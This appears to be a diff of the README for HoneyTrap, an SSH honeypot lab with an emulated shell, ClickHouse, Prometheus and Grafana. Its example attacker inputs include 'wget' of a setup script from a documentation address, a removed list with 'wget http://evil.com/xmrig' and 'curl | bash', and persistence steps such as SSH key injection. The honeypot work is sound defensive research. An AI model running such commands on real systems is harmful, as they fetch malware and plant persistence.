@@ -7,6 +7,7 @@
 </p>
 
 <p align="center">
+  <img src="https://github.com/lloredia/honeytrap/actions/workflows/ci.yml/badge.svg" alt="CI">
   <img src="https://img.shields.io/github/last-commit/lloredia/honeytrap?style=flat&logo=git&logoColor=white&color=0080ff" alt="last-commit">
   <img src="https://img.shields.io/github/languages/top/lloredia/honeytrap?style=flat&color=0080ff" alt="repo-top-language">
   <img src="https://img.shields.io/github/languages/count/lloredia/honeytrap?style=flat&color=0080ff" alt="repo-language-count">
@@ -29,213 +30,174 @@
 
 ---
 
+## Overview
 
-## 📖 Overview
+HoneyTrap is a small honeypot lab. The SSH service accepts connections and passwords, then answers from an **emulated** shell. Attacker input is written to a JSONL log. A collector tails that log into ClickHouse, Prometheus scrapes metrics, and Grafana reads ClickHouse. A Python helper can push source addresses to a sibling SentinelForge API.
 
-HoneyTrap is a modular honeypot system designed to capture, log, and analyze malicious activity. It simulates vulnerable services to attract attackers and records their every move — from login attempts to shell commands.
+The honeypot does not run `std::process` or a real shell. Commands such as `wget` and `curl` return canned errors.
 
 ---
 
-## 🏗️ Architecture
+## Architecture
 
 ```mermaid
-flowchart TB
-    subgraph Internet
-        A[🎭 Attacker]
-    end
-
-    subgraph HoneyTrap Network
-        subgraph Honeypots
-            SSH[🔐 SSH Honeypot<br/>Port 2222]
-        end
-
-        subgraph Core Services
-            COL[📦 Collector]
-            PROM[📊 Prometheus<br/>Port 9090]
-        end
-
-        subgraph Storage
-            CH[(🗄️ ClickHouse)]
-            JSONL[📄 events.jsonl]
-        end
-
-        subgraph Visualization
-            GRAF[📈 Grafana<br/>Port 3000]
-        end
-    end
-
-    A -->|SSH Connection| SSH
-    SSH -->|Events| JSONL
-    SSH -->|Events| COL
-    SSH -->|Metrics| PROM
-    COL -->|Store| CH
-    PROM -->|Query| GRAF
-    CH -->|Query| GRAF
+flowchart LR
+    Attacker[Attacker] -->|TCP 2222| Honeypot[SSH honeypot]
+    Honeypot --> JSONL[events JSONL]
+    JSONL --> Collector[Collector]
+    Collector -->|JSONEachRow| ClickHouse[(ClickHouse)]
+    ClickHouse --> Grafana[Grafana]
+    JSONL -.-> Tools[honeytrap_integration.py]
+    Tools -.->|X-API-Key| SentinelForge[SentinelForge API]
+    Honeypot -->|metrics| Prometheus[Prometheus]
+    Collector -->|metrics| Prometheus
 ```
-
----
-
-## 🔄 Event Flow
 
 ```mermaid
 sequenceDiagram
-    participant 🎭 Attacker
-    participant 🔐 SSH Honeypot
-    participant ⚙️ Event Processor
-    participant 💾 Storage
+    participant Attacker
+    participant Honeypot as SSH honeypot
+    participant JSONL as events JSONL
+    participant Collector
+    participant ClickHouse
+    participant Grafana
 
-    🎭 Attacker->>🔐 SSH Honeypot: TCP Connection
-    🔐 SSH Honeypot->>⚙️ Event Processor: Connection Event
-    ⚙️ Event Processor->>💾 Storage: Log to events.jsonl
-
-    🎭 Attacker->>🔐 SSH Honeypot: Auth (root/password123)
-    🔐 SSH Honeypot->>⚙️ Event Processor: Auth Event (credentials captured)
-    ⚙️ Event Processor->>💾 Storage: Log credentials
-
-    🎭 Attacker->>🔐 SSH Honeypot: Command (whoami)
-    🔐 SSH Honeypot-->>🎭 Attacker: root
-    🔐 SSH Honeypot->>⚙️ Event Processor: Command Event
-    ⚙️ Event Processor->>💾 Storage: Log command
+    Attacker->>Honeypot: SSH on port 2222
+    Honeypot->>JSONL: connection, auth, command
+    Honeypot-->>Attacker: emulated shell output
+    Collector->>JSONL: tail
+    Collector->>ClickHouse: INSERT events_raw
+    Grafana->>ClickHouse: dashboard queries
 ```
 
 ---
 
-## 🛠️ Tech Stack
-
-| Component | Technology | Purpose |
-|-----------|------------|---------|
-| **Language** | ![Rust](https://img.shields.io/badge/Rust-000000?style=flat&logo=rust&logoColor=white) | Memory-safe, high-performance core |
-| **Async Runtime** | ![Tokio](https://img.shields.io/badge/Tokio-463B3B?style=flat&logo=rust&logoColor=white) | Handles thousands of concurrent connections |
-| **SSH Protocol** | `russh` | SSH server implementation |
-| **Serialization** | ![JSON](https://img.shields.io/badge/Serde_JSON-000000?style=flat&logo=json&logoColor=white) | Event formatting and storage |
-| **Metrics** | ![Prometheus](https://img.shields.io/badge/Prometheus-E6522C?style=flat&logo=prometheus&logoColor=white) | Real-time monitoring |
-| **Visualization** | ![Grafana](https://img.shields.io/badge/Grafana-F46800?style=flat&logo=grafana&logoColor=white) | Dashboards and alerting |
-| **Database** | ![ClickHouse](https://img.shields.io/badge/ClickHouse-FFCC01?style=flat&logo=clickhouse&logoColor=black) | High-speed analytics storage |
-| **Containerization** | ![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat&logo=docker&logoColor=white) | Easy deployment |
-
----
-
-## 📁 Project Structure
-
-```mermaid
-graph LR
-    subgraph Workspace
-        ROOT[🍯 honeytrap/]
-        ROOT --> SHARED[📚 shared/]
-        ROOT --> HONEYPOTS[🪤 honeypots/]
-        ROOT --> COLLECTOR[📦 collector/]
-        
-        SHARED --> EVENTS[events.rs]
-        SHARED --> IOC[ioc.rs]
-        
-        HONEYPOTS --> SSH[🔐 ssh/]
-        SSH --> SERVER[server.rs]
-        SSH --> HANDLER[handler.rs]
-        SSH --> SESSION[session.rs]
-        SSH --> CONFIG[config.rs]
-        
-        COLLECTOR --> CLICKHOUSE[clickhouse.rs]
-    end
-```
+## Layout
 
 ```
 honeytrap/
-├── 📄 Cargo.toml              # Workspace configuration
-├── 🐳 docker-compose.yml      # Full stack deployment
-├── 📚 shared/                 # Shared library
-│   └── src/
-│       ├── lib.rs             # Event types, protocols
-│       └── ioc.rs             # Indicators of Compromise
-├── 🪤 honeypots/
-│   └── ssh/                   # SSH Honeypot
-│       └── src/
-│           ├── main.rs        # Entry point
-│           ├── server.rs      # SSH server & event processor
-│           ├── handler.rs     # Connection handler
-│           ├── session.rs     # Session state management
-│           └── config.rs      # Configuration
-└── 📦 collector/              # Event collector service
-    └── src/
-        ├── main.rs
-        └── clickhouse.rs      # ClickHouse integration
+├── Cargo.toml
+├── docker-compose.yml          # honeypot, collector, ClickHouse, Prometheus, Grafana
+├── docker/Dockerfile           # multi-stage honeypot and collector targets
+├── .env.example
+├── honeypots/ssh/              # emulated SSH honeypot
+├── collector/                  # JSONL -> ClickHouse
+├── shared/                     # events, IOC extraction, GeoIP stub
+├── configs/                    # Prometheus and Grafana provisioning
+├── data/events/ssh.jsonl       # synthetic sample (documentation IPs)
+└── tools/                      # SentinelForge push and synthetic events
 ```
 
 ---
 
-## 🚀 Quick Start
-
-### Prerequisites
-
-- **Rust 1.70+** 
-  ```bash
-  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-  ```
-- **Docker & Docker Compose** (optional, for full stack)
-
-### Build & Run
+## Quick start
 
 ```bash
-# Clone the repository
 git clone https://github.com/lloredia/honeytrap.git
 cd honeytrap
-
-# Build release binary
-cargo build --release
-
-# Run SSH honeypot
-cargo run -p honeytrap-ssh -- --port 2222
+cp .env.example .env
+# Set GRAFANA_ADMIN_PASSWORD and CLICKHOUSE_PASSWORD. Do not leave change-me.
+docker compose up --build -d
 ```
 
-### Test the Honeypot
+| Service | Where | Exposure |
+|---------|--------|----------|
+| SSH honeypot | `ssh -p 2222 root@127.0.0.1` | Published on all interfaces. Any password is accepted. |
+| Grafana | http://127.0.0.1:3000 | Loopback only. User and password come from `.env`. |
+| Prometheus | http://127.0.0.1:9090 | Loopback only. |
+| ClickHouse HTTP | http://127.0.0.1:8123 | Loopback only. |
+| Honeypot metrics | http://127.0.0.1:9100/metrics | Loopback only. |
+| Collector metrics | http://127.0.0.1:9108/metrics | Loopback only. |
+
+Grafana loads the ClickHouse datasource and the HoneyTrap dashboard from `configs/grafana`. A screenshot is not checked in. After the stack is up, export one from Grafana if you want it in this README.
+
+Try the emulated shell:
 
 ```bash
-# From another terminal
-ssh root@localhost -p 2222
-# Enter any password - all credentials are captured!
-
-# Try some commands in the fake shell
-whoami
-ls -la
+ssh -p 2222 root@127.0.0.1
+uname -a
 cat /etc/passwd
+wget http://203.0.113.10/setup.sh
 ```
 
+`wget` does not download anything. The command is stored in `/data/events/ssh.jsonl` inside the honeypot volume.
 
-## 🚀 Start the Lab using script
+### Without Docker
+
+Rust stable (see `rust-toolchain.toml`) and a ClickHouse you can reach on loopback:
+
 ```bash
-Start ClickHouse and Grafana:
-
-
-docker compose -f docker-compose.clickhouse.yml up -d
-```
-## Start the honeypot and collector:
-```bash
+cp .env.example .env
 ./run-lab.sh
 ```
-🔐 Connect to Honeypot
+
+The host key is created at `data/keys/ssh_host_ed25519` on first start and reused. `run-lab.sh` does not wipe your SSH known_hosts entry.
+
+---
+
+## Safe deployment
+
+A honeypot is bait. Treat the host as compromised the moment it is reachable.
+
+- Run it on an isolated VM or VPC, with no production data and no route to internal systems.
+- Deny egress from that host. The emulated shell does not fetch payloads, and a firewall keeps it that way if the emulation is ever bypassed. The Grafana image installs its ClickHouse plugin at build time, so the running stack does not need to download it.
+- Publish only port 2222. Grafana, Prometheus, ClickHouse, and the metrics ports in this Compose file listen on `127.0.0.1`.
+- Move the real SSH daemon off port 22 before this host is reachable. Keep administrative access on a different port or a different host, and do not share that path with the honeypot.
+- Passwords live in `.env`, which is gitignored. The collector reads `CLICKHOUSE_PASSWORD` from the environment, not from its command line.
+- The honeypot and collector images are non-root, with a read-only root filesystem, all capabilities dropped, and `no-new-privileges`. Every service has memory and CPU limits. ClickHouse keeps its default capabilities because its entrypoint starts as root and then drops to the `clickhouse` user.
+- The SSH host key is stored on the data volume so the fingerprint does not change on every restart.
+
+**Legal and ethics.** Deploy only on systems you own or where you have written authorization. Recording traffic and credentials can be regulated. Do not reuse captured commands, keys, or payloads against anyone else. The sample data in this repository uses documentation addresses from RFC 5737 (`203.0.113.0/24`, `198.51.100.0/24`, `192.0.2.0/24`), not live indicators.
+
+---
+
+## Configuration
+
+| Variable | Default | Used by |
+|----------|---------|---------|
+| `GRAFANA_ADMIN_USER` / `GRAFANA_ADMIN_PASSWORD` | set in `.env` | Grafana |
+| `CLICKHOUSE_USER` / `CLICKHOUSE_PASSWORD` / `CLICKHOUSE_DB` | set in `.env` | ClickHouse, collector, Grafana |
+| `SSH_PORT` | `2222` | Compose publish port and `run-lab.sh` |
+| `HONEYPOT_ID` | `ssh-01` | Event destination |
+| `RUST_LOG` | `info` | honeypot and collector |
+| `SENTINELFORGE_API_URL` | `http://127.0.0.1:8080/api/v1` | `tools/honeytrap_integration.py` |
+| `SENTINELFORGE_API_KEY` | required to push IOCs | sent as `X-API-Key` |
+
+Honeypot limits (CLI flags, with these defaults): 64 concurrent sessions, 4 per source IP, 60s idle timeout, 300s session timeout, 512-character lines, 4096-byte input chunks.
+
+---
+
+## Events
+
+`data/events/ssh.jsonl` is a short synthetic session. Live Docker logs go to the `honeytrap-data` volume, not that file.
+
+```json
+{
+  "protocol": "ssh",
+  "category": "command",
+  "severity": "high",
+  "source": { "ip": "203.0.113.10", "port": 51234 },
+  "destination": { "ip": "10.0.0.5", "port": 2222, "honeypot_id": "ssh-01" },
+  "command": { "command": "uname -a", "command_name": "uname" }
+}
+```
+
+Prometheus metrics include `honeytrap_events_captured_total`, `honeytrap_active_sessions`, `honeytrap_auth_attempts_total`, and `honeytrap_connections_rejected_total`.
+
+---
+
+## SentinelForge and synthetic traffic
 
 ```bash
-ssh root@localhost -p 2222
-
-```
-📊 View Dashboard
-
-Open Grafana in your browser:
-```arduino
-http://localhost:13000
-
-```
-🔑 Login
-```pgsql
-Username: admin
-Password: admin
-
+cd tools
+python -m pip install -e ".[dev]"
+export SENTINELFORGE_API_URL=http://127.0.0.1:8080/api/v1
+export SENTINELFORGE_API_KEY=replace-me
+python honeytrap_integration.py --events-file ../data/events/ssh.jsonl
+python honeytrap_test_generator.py --output ../events.jsonl --sessions 50 --clear
 ```
 
-### View Captured Events
-
-```bash
-cat events.jsonl | jq .
-```
+The generator writes the same JSON shape the collector parses, using documentation IPs only.
 
 ---
 
@@ -245,183 +207,71 @@ cat events.jsonl | jq .
   <img src="assets/demo.gif" width="900" alt="Honeytrap animated demo" />
 </p>
 
-
 ---
 
-## 📊 Sample Event Output
-
-```json
-{
-  "id": "d42cbef9-7328-407f-b2f4-0dd9a1cadaf0",
-  "session_id": "f97f3ea1-fab7-4c70-964f-902b533457ff",
-  "timestamp": "2026-01-21T09:36:42.745Z",
-  "protocol": "ssh",
-  "category": "authentication",
-  "severity": "high",
-  "source": {
-    "ip": "192.168.1.100",
-    "port": 58719
-  },
-  "destination": {
-    "ip": "0.0.0.0",
-    "port": 2222,
-    "honeypot_id": "ssh-01"
-  },
-  "credentials": {
-    "username": "root",
-    "password": "admin123",
-    "auth_method": "password",
-    "success": true
-  },
-  "tags": ["password_auth"]
-}
-```
- Basic usage - generate 50 attack sessions:
-```bash
-python honeytrap_test_generator.py --output events.jsonl --sessions 50
-```
-Generate 100 sessions, mostly successful compromises:
-```bash
-python honeytrap_test_generator.py -o events.jsonl -n 100 --mode compromise --clear
-```
-Stream live events continuously (for testing the watcher):
-```bash
-python honeytrap_test_generator.py --output events.jsonl --stream --interval 1.0
-```
-What it generates:
-ModeDescriptionmixedRealistic mix: 60% quick scans, 30% brute force, 10% full compromisescansAutomated scanners (1-2 quick attempts, disconnect)bruteforceExtended brute-force sessions (3-20 attempts)compromiseFull attack chain: brute force → success → recon → malware → persistence
-Included attacker IPs from:
-
-🇩🇪 German Tor exits (185.220.x.x)
-🇷🇺 Russian bulletproof hosting (194.26.x.x, 91.243.x.x)
-🇨🇳 Chinese scan sources (218.92.x.x, 61.177.x.x)
-🇻🇳 Vietnamese scanners (113.160.x.x)
-🇧🇷 Brazilian attack sources (179.60.x.x)
-🇳🇱 Dutch VPS abuse (89.248.x.x, 80.82.x.x)
-
-Sample commands captured:
-
-Recon: id, uname -a, cat /etc/passwd 
-Malware: wget http://evil.com/xmrig, curl | bash
-Persistence: crontab, useradd, SSH key injection
-Cryptomining: xmrig, minerd execution
----
-
-## 🐳 Docker Deployment
-
-### Full Stack
+## Development
 
 ```bash
-# Start SSH Honeypot + Prometheus + Grafana
-docker-compose up -d
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings
+cargo test --workspace
+cargo audit
+cargo deny check
 ```
-
-| Service | URL | Credentials |
-|---------|-----|-------------|
-| 🔐 SSH Honeypot | `ssh root@localhost -p 2222` | any password |
-| 📊 Prometheus | http://localhost:9090 | - |
-| 📈 Grafana | http://localhost:3000 | admin / admin |
-
-### With ClickHouse Analytics
 
 ```bash
-docker-compose -f docker-compose_clickhouse.yml up -d
+cd tools && ruff check . && pytest
 ```
 
----
-
-## ⚙️ Configuration
-
-| Environment Variable | Default | Description |
-|---------------------|---------|-------------|
-| `RUST_LOG` | `info` | Log level (debug, info, warn, error) |
-| `SSH_PORT` | `2222` | SSH honeypot listen port |
-| `METRICS_PORT` | `9100` | Prometheus metrics port |
-
-### CLI Options
+Images:
 
 ```bash
-honeytrap-ssh --help
-
-Options:
-  --host <HOST>    Listen address [default: 0.0.0.0]
-  --port <PORT>    SSH port [default: 2222]
-  -h, --help       Print help
+docker build --target honeypot -t honeytrap-ssh:local .
+docker build --target collector -t honeytrap-collector:local .
 ```
 
----
-
-## 📈 Metrics & Dashboards
-
-Prometheus metrics exposed at `:9100/metrics`:
-
-| Metric | Type | Description |
-|--------|------|-------------|
-| `honeytrap_events_captured_total` | Counter | Total events by category |
-| `honeytrap_active_sessions` | Gauge | Current active sessions |
-| `honeytrap_auth_attempts_total` | Counter | Authentication attempts |
-
-### Dashboard Overview
-![Dashboard Overview](assets/image.png)
-
+GitHub Actions runs fmt, Clippy, tests, `cargo audit`, `cargo deny`, both image builds, Trivy, Ruff, pytest, and gitleaks.
 
 ---
 
-## ⚠️ Security Considerations
+## Roadmap
 
-> **Warning**: Honeypots intentionally attract malicious traffic. Deploy responsibly.
-
-- 🔒 Run in an isolated network/VM
-- 🚫 Never expose your real services on the same host
-- 📊 Monitor resource usage (attackers may attempt DoS)
-- 🔍 Regularly review captured data for actionable intelligence
-
----
-
-## 🗺️ Roadmap
-
-- [x] 🔐 SSH Honeypot
-- [x] 🔑 Credential capture
-- [x] 💻 Command logging
-- [x] 📊 Prometheus metrics
-- [x] 📄 JSON event logging
-- [ ] 🌐 HTTP/HTTPS Honeypot
-- [ ] 📡 Telnet Honeypot
-- [ ] 📂 FTP Honeypot
-- [ ] 🌍 GeoIP enrichment
-- [ ] 🚨 Real-time alerting
-- [ ] 🖥️ Web UI dashboard
+- [x] SSH honeypot with an emulated shell
+- [x] Credential and command capture
+- [x] Stable host key and session limits
+- [x] JSONL events, collector, ClickHouse, Prometheus, Grafana provisioning
+- [x] Optional SentinelForge IOC push
+- [ ] HTTP honeypot
+- [ ] Telnet honeypot
+- [ ] FTP honeypot
+- [ ] GeoIP enrichment (the shared helper is still a stub)
+- [ ] Alerting
+- [ ] Web UI
 
 ---
 
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
+## Contributing
 
 1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+2. Create a feature branch
+3. Open a pull request
 
 ---
 
-## 📄 License
+## License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+MIT. See [LICENSE](LICENSE).
 
 ---
 
-## 🙏 Acknowledgments
+## Acknowledgments
 
-- [russh](https://github.com/warp-tech/russh) - Rust SSH implementation
-- [Tokio](https://tokio.rs/) - Async runtime for Rust
-- [Cowrie](https://github.com/cowrie/cowrie) - Inspiration for SSH honeypot features
+- [russh](https://github.com/warp-tech/russh) — SSH implementation
+- [Tokio](https://tokio.rs/) — async runtime
+- [Cowrie](https://github.com/cowrie/cowrie) — inspiration for SSH honeypot behavior
 
 ---
 
 <p align="center">
   <img src="assets/honeytrap-logo-small.png" alt="HoneyTrap Logo" width="100">
-  <br>
-  <strong>Made by <a href="https://github.com/lloredia">lloredia</a></strong>
 </p>
